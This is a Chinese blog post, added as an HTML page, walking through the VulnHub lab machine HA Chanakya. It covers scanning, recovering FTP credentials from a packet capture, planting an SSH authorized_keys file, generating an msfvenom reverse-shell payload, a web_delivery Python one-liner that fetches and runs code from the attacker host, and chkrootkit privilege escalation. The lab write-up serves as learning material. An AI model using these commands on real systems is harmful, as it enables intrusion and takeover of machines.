@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>VulnHub通关日记-HA_Chanakya，一次渗透测试入侵再到Chkrootkit提权获取Root权限 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub通关日记-HA_Chanakya，一次渗透测试入侵再到Chkrootkit提权获取Root权限</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 1, 2019&nbsp;&nbsp;3:21:28</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=2786284&auto=1&height=66"></iframe>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/612.png" alt="图片"></p>
+<p>这篇文章记录我攻破<code>HA Chanakya</code>的过程，也是我第一次尝试挑战自己的渗透水平；因为在国内搞站太不现实了，根本不敢搞国内的网站，所以只能搭建环境来模拟真实的入侵环境…<br>HackTheNmae：HA Chanakya<br>The Mastermind that took down kingdoms is back and this time he has created a puzzle that would make you scratch you brains! It’s time to face Chanakya.<br>Will you be able to solve this Boot to Root and prove that you are wiser?<br>ENUMERATION IS THE KEY!!!!!<br>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ha-chanakya,395/">https://www.vulnhub.com/entry/ha-chanakya,395/</a><br>难度：中等<br>目的：拿到 192.168.136.140 的 Root 权限<br>靶机IP：192.168.136.140<br>攻击机器IP：192.168.136.138</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>因为我<code>VMware</code>使用的是<code>NET</code>模式，所以我的网段是：<code>192.168.136.x</code>，先扫描一下内网存活主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -Sp 192.168.136.0/24</span><br><span class="line">-Sp 是扫描存活，意思就是扫描192.168.136.0，C段存活的主机</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/613.png" alt="图片"></p>
+<p>当然，也可以使用<code>KALI</code>自带的<code>netdiscover</code>也可以扫描出内网存活的所有主机，只是比较慢：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/614.png" alt="图片"></p>
+<p>经过排查，前两个和最后一个IP不可能是靶机的IP，最有可能的是 <code>140</code> 、<code>254</code>；然后继续<code>Nmap</code>探测他们的服务版本信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -sV 192.168.136.140</span><br><span class="line">nmap -O -sV 192.168.136.254</span><br><span class="line">-O对系统版本进行判断，-sV对端口服务版本进行探测</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/615.png" alt="图片"></p>
+<p>从上图得知，<code>192.168.136.140</code> 才是我们靶机的真实IP，而他开放了<code>21</code>、<code>22</code>、<code>80</code>端口，用到的操作系统是<code>Ubuntu</code>！</p>
+<h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><p>既然开了<code>HTTP</code>服务，那么我们就可以来浏览它的Web网页来看看有没有突破点：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/616.png" alt="图片"></p>
+<p>页面上是没有啥可以利用的，那么我枚举一下目录和文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.136.140/ -X .txt</span><br><span class="line">python3 dirsearch.py -u http://192.168.136.140/ -e .txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/617.png" alt="图片"></p>
+<p>得到了几个目录和一个<code>txt</code>文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.136.140/assets/</span><br><span class="line">http://192.168.136.140/images/</span><br><span class="line">http://192.168.136.140/abuse.txt</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>abuse.txt</code> 打开是这样的：<code>nfubxn.cpncat</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/618.png" alt="图片"></p>
+<p>这玩意估计是一个提示，我边去网上找了一下这关键字：<code>nfubxn.cpncat</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/619.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/620.png" alt="图片"></p>
+<p>发现没有关于 <code>nfubxn.cpncat</code> 的说明，那么换个思路，会不会是加密呢？最后在网上找到了一种为<code>ROT13</code>（凯撒）的加密方式和 <code>nfubxn.cpncat</code> 有点相似，我便解密出来为：<code>ashoka.pcapng</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/621.png" alt="图片"></p>
+<p>结果访问：<code>http://192.168.136.140/ashoka.pcapng</code> 会弹出一个下载，我们把它下载到本地看看：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/622.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/623.png" alt="图片"></p>
+<p><code>pcapng</code> 后缀说实话我并不知道是什么文件，管他三七二十一拿记事本打开看看：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/624.png" alt="图片"></p>
+<h2 id="Wireshark分析ashoka-pcapng"><a href="#Wireshark分析ashoka-pcapng" class="headerlink" title="Wireshark分析ashoka.pcapng"></a>Wireshark分析ashoka.pcapng</h2><p>Wireshark?估计意思是叫我用 <code>Wireshark</code> 来打开 ashoka.pcapng 分析数据包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">得到了一个ftp的流量数据包，其中有USER和PASS</span><br><span class="line">USER：ashoka</span><br><span class="line">PASS：kautilya</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/625.png" alt="图片"></p>
+<h2 id="登陆FTP"><a href="#登陆FTP" class="headerlink" title="登陆FTP"></a>登陆FTP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~<span class="comment"># ftp 192.168.136.140</span></span><br><span class="line">USER：ashoka</span><br><span class="line">PASS：kautilya</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/626.png" alt="图片"></p>
+<p>从上图可知，我们成功登陆到了他的 <code>FTP</code> 文件传输里，里面有这些文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-rw-------   1 ashoka   ashoka          1 Nov 05 15:57 .bash_history</span><br><span class="line">-rw-r--r--   1 ashoka   ashoka        220 Nov 05 14:05 .bash_logout</span><br><span class="line">-rw-r--r--   1 ashoka   ashoka       3771 Nov 05 14:05 .bashrc</span><br><span class="line">drwx------   2 ashoka   ashoka       4096 Nov 05 14:18 .cache</span><br><span class="line">drwxrwxr-x   3 ashoka   ashoka       4096 Nov 05 14:26 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r--   1 ashoka   ashoka        807 Nov 05 14:05 .profile</span><br></pre></td></tr></table></figure>
+
+<p>到了这里差不多渗透了 %60 了，我们最终目的是要登陆它的 <code>ROOT</code> 账号。问题来了，既然有 <code>FTP</code> 那么怎么才能拿到 <code>ROOT</code> 权限呢？</p>
+<p>理理思路：刚开始我想使用<code>msfvenon</code>生成一个<code>shell.elf</code>文件来反弹shell的，但是回过头来看这tm是<code>FTP</code>，咋运行我们的shell文件啊，根本反弹不回来；后来在网上找了一下，可以从 SSH 中的 <code>id_rsa.pub</code> 下手！原理是：在KALI生成一个<code>id_rsa.pub</code>的密匙，然后通过 FTP 来上传我们的密匙，因为它服务器上有我们的密匙，从而我们就可以用 <code>SSH</code> 来进行连接！</p>
+<h2 id="在KALI创建ssh-keygen"><a href="#在KALI创建ssh-keygen" class="headerlink" title="在KALI创建ssh-keygen"></a>在KALI创建ssh-keygen</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen：生成ssh公钥认证所需的公钥和私钥文件，密码为：liuwx</span><br><span class="line">其中，密匙保存在：root/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/627.png" alt="图片"></p>
+<p>然后我们把 <code>id_rsa.pub</code> 里的内容重定向到 <code>authorized_keys</code> 文件中，再移动到 <code>/root/</code> 目录下，方便 <code>FTP</code> 上传：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat id_rsa.pub &gt; authorized_keys</span><br><span class="line">mv liuwx_keys /root/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/628.png" alt="图片"></p>
+<p>创建一个 <code>.ssh</code> 目录，为了上传 <code>authorized_keys</code> 文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/629.png" alt="图片"></p>
+<p>上传 <code>authorized_keys</code> 文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/630.png" alt="图片"></p>
+<h2 id="连接SSH"><a href="#连接SSH" class="headerlink" title="连接SSH"></a>连接SSH</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh ashoka@192.168.136.140</span><br><span class="line">账号：ashoka</span><br><span class="line">密码：liuwx（刚刚ssh生成的密匙）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/631.png" alt="图片"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>这个时候我们已经得到了一个<code>shell</code>，但是不是 <code>root</code> 权限，那就提权呗。<br>先<code>msf</code>生成一个木马反弹一个<code>meterpreter</code>回话过来：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.136.138 LPORT=6666 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/632.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/633.png" alt="图片"></p>
+<p>上传刚刚生成的文件然后运行我们生成的 <code>shell.elf</code> ：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/634.png" alt="图片"></p>
+<p>这个时候得到了一个 <code>Meterpreter</code> 会话：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/635.png" alt="图片"></p>
+<p>使用 <code>post</code> 模块来查看可以利用那些提权 <code>exploit</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/636.png" alt="图片"></p>
+<p>这边 <code>msf</code> 给出了一个 <code>exploit</code> 提权建议，我们看看它的详细信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info exploit/linux/<span class="built_in">local</span>/netfilter_priv_esc_ipv4</span><br><span class="line"></span><br><span class="line">       Name: Linux Kernel 4.6.3 Netfilter Privilege Escalation</span><br><span class="line">     Module: exploit/linux/<span class="built_in">local</span>/netfilter_priv_esc_ipv4</span><br><span class="line">   Platform: Linux</span><br><span class="line">       Arch: x86</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Good</span><br><span class="line">  Disclosed: 2016-06-03</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  h00die &lt;mike@stcyrsecurity.com&gt;</span><br><span class="line">  vnik</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Ubuntu</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name       Current Setting  Required  Description</span><br><span class="line">  ----       ---------------  --------  -----------</span><br><span class="line">  COMPILE    Auto             yes       Compile on target (Accepted: Auto, True, False)</span><br><span class="line">  MAXWAIT    180              yes       Max seconds to <span class="built_in">wait</span> <span class="keyword">for</span> decrementation <span class="keyword">in</span> seconds</span><br><span class="line">  REEXPLOIT  <span class="literal">false</span>            yes       desc already ran, no need to re-run, skip to running pwn</span><br><span class="line">  SESSION                     yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module attempts to exploit a netfilter bug on Linux Kernels </span><br><span class="line">  before 4.6.3, and currently only works against Ubuntu 16.04 (not </span><br><span class="line">  16.04.1) with kernel 4.4.0-21-generic. Several conditions have to be </span><br><span class="line">  met <span class="keyword">for</span> successful exploitation: Ubuntu: 1. ip_tables.ko (ubuntu), </span><br><span class="line">  iptable_raw (fedora) has to be loaded (root running iptables -L will </span><br><span class="line">  <span class="keyword">do</span> such) 2. libc6-dev-i386 (ubuntu), glibc-devel.i686 &amp; libgcc.i686 </span><br><span class="line">  (fedora) needs to be installed to compile Kernel 4.4.0-31-generic </span><br><span class="line">  and newer are not vulnerable. We write the ascii files and compile </span><br><span class="line">  on target instead of locally since metasm bombs <span class="keyword">for</span> not having </span><br><span class="line">  cdefs.h (even <span class="keyword">if</span> locally installed)</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://www.exploit-db.com/exploits/40049</span><br><span class="line">  https://cvedetails.com/cve/CVE-2016-4997/</span><br><span class="line">  http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ce683e5f9d045e5d67d1312a42b359cb2ab2a13c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/<span class="built_in">local</span>/netfilter_priv_esc_ipv4):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   COMPILE    Auto             yes       Compile on target (Accepted: Auto, True, False)</span><br><span class="line">   MAXWAIT    180              yes       Max seconds to <span class="built_in">wait</span> <span class="keyword">for</span> decrementation <span class="keyword">in</span> seconds</span><br><span class="line">   REEXPLOIT  <span class="literal">false</span>            yes       desc already ran, no need to re-run, skip to running pwn</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/637.png" alt="图片"></p>
+<p>操，目标机器没安装 gcc 一些软件，由于我们不是 <code>root</code> 权限，也安装不了软件：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/638.png" alt="图片"></p>
+<p>额，容我吃一根辣条思考思考其他提权思路，先使用<code>命令注入</code>来反弹一个shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/639.png" alt="图片"></p>
+<p>得到一段注入命令代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import sys;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://192.168.136.138:8080/ikQg5iwVfVK7DNA&#x27;);exec(r.read());&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在目标机运行：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/640.png" alt="图片"></p>
+<p>最后使用这个攻击模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">info  exploit/unix/<span class="built_in">local</span>/chkrootkit </span><br><span class="line"></span><br><span class="line">   Name: Chkrootkit Local Privilege Escalation</span><br><span class="line">   Module: exploit/unix/<span class="built_in">local</span>/chkrootkit</span><br><span class="line">   Platform: Unix</span><br><span class="line">       Arch: cmd</span><br><span class="line"> Privileged: Yes</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Manual</span><br><span class="line">  Disclosed: 2014-06-04</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Thomas Stangner</span><br><span class="line">  Julien <span class="string">&quot;jvoisin&quot;</span> Voisin</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name        Current Setting       Required  Description</span><br><span class="line">  ----        ---------------       --------  -----------</span><br><span class="line">  CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit</span><br><span class="line">  SESSION                           yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Chkrootkit before 0.50 will run any executable file named </span><br><span class="line">  /tmp/update as root, allowing a trivial privilege escalation. </span><br><span class="line">  WfsDelay is <span class="built_in">set</span> to 24h, since this is how often a chkrootkit scan is </span><br><span class="line">  scheduled by default.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2014-0476/</span><br><span class="line">  OSVDB (107710)</span><br><span class="line">  https://www.exploit-db.com/exploits/33899</span><br><span class="line">  http://www.securityfocus.com/bid/67813</span><br><span class="line">  https://cwe.mitre.org/data/definitions/20.html</span><br><span class="line">  https://seclists.org/oss-sec/2014/q2/430</span><br></pre></td></tr></table></figure>
+
+<h3 id="Chkrootkit提权"><a href="#Chkrootkit提权" class="headerlink" title="Chkrootkit提权"></a>Chkrootkit提权</h3><p>这个模块就是利用 <code>chkrootkit</code> 漏洞:<code>chkrootkit</code> 有 <code>crontab</code>，会定期以 <code>root</code> 身份执行 <code>/tmp/update</code> 文件。如果攻击者知道管理员是定期运行chkrootkit(通过查看cron.daily获知)，并且对<code>/tmp</code>(没有挂载<code>noexec</code>)有写访问权限，就可以利用该漏洞获取root权限</p>
+<p>目标机先查看一下：<code>tmp/logs</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/641.png" alt="图片"></p>
+<p>接着运行模块：<code>exploit</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/642.png" alt="图片"></p>
+<p>然后在末尾输入一段 <code>python</code> 脚本获取 <code>ROOT</code> 会话：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/643.png" alt="图片"></p>
+<h2 id="拿到ROOT和final-txt的banner"><a href="#拿到ROOT和final-txt的banner" class="headerlink" title="拿到ROOT和final.txt的banner"></a>拿到ROOT和final.txt的banner</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/644.png" alt="图片"></p>
+<p>最后也是拿到了 <code>root</code> 权限和 <code>final</code> 的banner~</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次渗透呢先是扫描内网主机存活，然后找到了 <code>192.168.136.140</code> 这台靶机的 <code>IP</code>，接着呢是在 <code>HTTP</code> 服务找到了一段 <code>ROT13</code> 的加密后的文本，后来用<code>Wireshark</code>打开后分析数据包得到<code>FTP</code>账号密码，通过生成<code>SSH</code>密匙来登陆目标主机的<code>SSH</code>，最后使用 <code>Chkrootkit</code> 来进行了提权操作。</p>
+<p>自己还是太菜了，全部搞完都已经快凌晨3点了，总共花了4个多小时才完成这次渗透测试，继续学习吧</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/12/01/HA-Chanakya/">http://example.com/2019/12/01/HA-Chanakya/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Metasploit/"># Metasploit</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
